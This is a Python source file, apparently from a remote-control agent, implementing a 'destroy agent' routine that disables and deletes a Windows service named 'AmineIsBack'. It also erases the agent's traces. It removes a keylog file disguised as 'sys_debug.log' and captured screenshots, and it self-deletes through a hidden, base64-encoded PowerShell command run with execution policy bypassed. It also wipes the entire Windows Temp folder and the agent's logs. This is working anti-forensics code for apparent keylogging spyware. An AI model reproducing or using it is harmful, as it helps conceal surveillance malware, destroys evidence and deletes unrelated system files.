"""
Tool: Destroy Agent
Completely destroys the agent and the associated Windows service
"""
import sys
import os
import time
import tempfile
import shutil

if sys.platform == 'win32':
    try:
        import win32service
        import win32serviceutil
        HAS_WIN32 = True
    except ImportError:
        HAS_WIN32 = False
else:
    HAS_WIN32 = False

SERVICE_NAME = "AmineIsBack"


def stop_service():
    """Stops the Windows service if it is running"""
    if not HAS_WIN32:
        return True
    
    try:
        try:
            status = win32serviceutil.QueryServiceStatus(SERVICE_NAME)
            current_status = status[1]
        except Exception:
            return True
        
        if current_status == win32service.SERVICE_RUNNING:
            try:
                win32serviceutil.StopService(SERVICE_NAME)
            except Exception:
                return False
            
            timeout = 30
            elapsed = 0
            while elapsed < timeout:
                try:
                    status = win32serviceutil.QueryServiceStatus(SERVICE_NAME)
                    if status[1] != win32service.SERVICE_RUNNING:
                        return True
                except Exception:
                    return True
                time.sleep(1)
                elapsed += 1
            
            return False
        
        return True
    except Exception:
        return False


def disable_service():
    """Disables the Windows service to prevent automatic restart"""
    if not HAS_WIN32:
        return True
    
    try:
        hscm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
        hsrv = win32service.OpenService(
            hscm,
            SERVICE_NAME,
            win32service.SERVICE_CHANGE_CONFIG | win32service.SERVICE_QUERY_CONFIG
        )
        
        win32service.ChangeServiceConfig(
            hsrv,
            win32service.SERVICE_NO_CHANGE,
            win32service.SERVICE_DISABLED,
            win32service.SERVICE_NO_CHANGE,
            None, None, 0, None, None, None, None
        )
        
        win32service.CloseServiceHandle(hsrv)
        win32service.CloseServiceHandle(hscm)
        return True
    except Exception:
        return False


def uninstall_service():
    """Uninstalls the Windows service"""
    if not HAS_WIN32:
        return True
    
    try:
        try:
            win32serviceutil.QueryServiceStatus(SERVICE_NAME)
        except Exception:
            return True
        
        disable_service()
        time.sleep(1)
        
        stop_service()
        
        time.sleep(3)
        
        try:
            win32serviceutil.RemoveService(SERVICE_NAME)
            time.sleep(2)
            
            try:
                win32serviceutil.QueryServiceStatus(SERVICE_NAME)
                raise Exception("Service still exists")
            except Exception:
                return True
        except Exception:
            try:
                hscm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
                hsrv = win32service.OpenService(
                    hscm,
                    SERVICE_NAME,
                    win32service.SERVICE_ALL_ACCESS
                )
                win32service.DeleteService(hsrv)
                win32service.CloseServiceHandle(hsrv)
                win32service.CloseServiceHandle(hscm)
                
                time.sleep(2)
                try:
                    win32serviceutil.QueryServiceStatus(SERVICE_NAME)
                    return False
                except Exception:
                    return True
            except Exception:
                return False
    except Exception:
        return False


def get_agent_path():
    """Determines the path of the agent's binary or installation directory"""
    if getattr(sys, "frozen", False):
        return sys.executable
    else:
        from pathlib import Path
        return Path(__file__).parent.parent.parent


def cleanup_agent_binary():
    """Deletes the agent binary and all associated files"""
    cleaned = []
    
    try:
        agent_path = get_agent_path()
        agent_path_str = str(agent_path)
        
        if os.path.isfile(agent_path_str):
            if sys.platform == 'win32':
                try:
                    import ctypes
                    from ctypes import wintypes
                    import subprocess
                    
                    try:
                        os.remove(agent_path_str)
                        cleaned.append(agent_path_str)
                        return len(cleaned)
                    except Exception:
                        pass
                    
                    try:
                        ctypes.windll.kernel32.MoveFileExW(
                            ctypes.c_wchar_p(agent_path_str),
                            None,
                            0x00000004
                        )
                        cleaned.append(agent_path_str)
                    except Exception:
                        pass
                    
                    try:
                        exe_name = os.path.basename(agent_path_str)
                        exe_path_escaped = agent_path_str.replace('\\', '\\\\').replace('"', '\\"')
                        
                        ps_script = f"""
$exePath = "{exe_path_escaped}"
$exeName = "{exe_name}"
$maxWait = 60
$waited = 0

while ($waited -lt $maxWait) {{
    $proc = Get-Process -Name $exeName.Replace('.exe', '') -ErrorAction SilentlyContinue
    if (-not $proc) {{
        break
    }}
    Start-Sleep -Seconds 1
    $waited++
}}

Start-Sleep -Seconds 3

$maxRetries = 10
$retry = 0
while ($retry -lt $maxRetries) {{
    try {{
        if (Test-Path $exePath) {{
            Remove-Item -Path $exePath -Force -ErrorAction Stop
        }}
        break
    }} catch {{
        $retry++
        if ($retry -lt $maxRetries) {{
            Start-Sleep -Seconds 1
        }}
    }}
}}
"""
                        ps_bytes = ps_script.encode('utf-16le')
                        ps_b64 = __import__('base64').b64encode(ps_bytes).decode('ascii')
                        
                        subprocess.Popen(
                            ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-EncodedCommand', ps_b64],
                            creationflags=0x08000000,
                            close_fds=True,
                            stdin=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        cleaned.append(agent_path_str)
                    except Exception:
                        pass
                    
                except Exception:
                    pass
            else:
                try:
                    os.remove(agent_path_str)
                    cleaned.append(agent_path_str)
                except Exception:
                    pass
        
        elif os.path.isdir(agent_path_str):
            try:
                deleted_count = 0
                for item in os.listdir(agent_path_str):
                    item_path = os.path.join(agent_path_str, item)
                    try:
                        if os.path.isfile(item_path):
                            os.remove(item_path)
                            deleted_count += 1
                            cleaned.append(item_path)
                        elif os.path.isdir(item_path):
                            shutil.rmtree(item_path, ignore_errors=True)
                            deleted_count += 1
                            cleaned.append(item_path)
                    except Exception:
                        pass
                
                try:
                    os.rmdir(agent_path_str)
                except Exception:
                    pass
            except Exception:
                pass
    
    except Exception:
        pass
    
    return len(cleaned)


def cleanup_temp_files():
    """Cleans temporary files created by the agent"""
    cleaned = []
    
    try:
        public_dir = os.environ.get('PUBLIC', os.environ.get('SystemDrive', 'C:') + '\\Users\\Public')
        keylog_file = os.path.join(public_dir, "sys_debug.log")
        if os.path.exists(keylog_file):
            try:
                os.remove(keylog_file)
                cleaned.append(keylog_file)
            except Exception:
                pass
        
        if sys.platform == "win32":
            temp_dir = os.environ.get("SystemRoot", "C:\\Windows") + "\\Temp"
            if os.path.exists(temp_dir):
                try:
                    deleted_count = 0
                    for item in os.listdir(temp_dir):
                        item_path = os.path.join(temp_dir, item)
                        try:
                            if os.path.isfile(item_path):
                                os.remove(item_path)
                                deleted_count += 1
                                cleaned.append(item_path)
                            elif os.path.isdir(item_path):
                                shutil.rmtree(item_path, ignore_errors=True)
                                deleted_count += 1
                                cleaned.append(item_path)
                        except Exception:
                            pass
                except Exception:
                    pass
        
        temp_dir = tempfile.gettempdir()
        if os.path.exists(temp_dir):
            try:
                for filename in os.listdir(temp_dir):
                    if filename.startswith("screenshot_") and (filename.endswith(".png") or filename.endswith(".bmp") or filename.endswith(".jpg")):
                        filepath = os.path.join(temp_dir, filename)
                        try:
                            if os.path.isfile(filepath):
                                os.remove(filepath)
                                cleaned.append(filepath)
                        except Exception:
                            pass
            except Exception:
                pass
        
    except Exception:
        pass
    
    return len(cleaned)


def cleanup_logs():
    """Cleans log files if configured"""
    try:
        from client.config import Config
        config = Config()
        
        log_file = config.get("logging", "file", None)
        if log_file and os.path.exists(log_file):
            try:
                os.remove(log_file)
                return True
            except Exception:
                pass
    except Exception:
        pass
    
    return False


def destroy_agent():
    """
    Completely destroys the agent:
    - Disables the Windows service (prevents automatic restart)
    - Stops the Windows service
    - Uninstalls the service
    - Cleans temporary files
    - Deletes the binary
    - Cleans logs
    """
    results = {
        'service_disabled': False,
        'service_stopped': False,
        'service_uninstalled': False,
        'files_cleaned': 0,
        'binary_cleaned': 0,
        'logs_cleaned': False
    }
    
    if HAS_WIN32:
        results['service_disabled'] = disable_service()
        results['service_stopped'] = stop_service()
        results['service_uninstalled'] = uninstall_service()
        
        if results['service_uninstalled']:
            time.sleep(2)
    
    results['files_cleaned'] = cleanup_temp_files()
    results['binary_cleaned'] = cleanup_agent_binary()
    results['logs_cleaned'] = cleanup_logs()
    
    return results
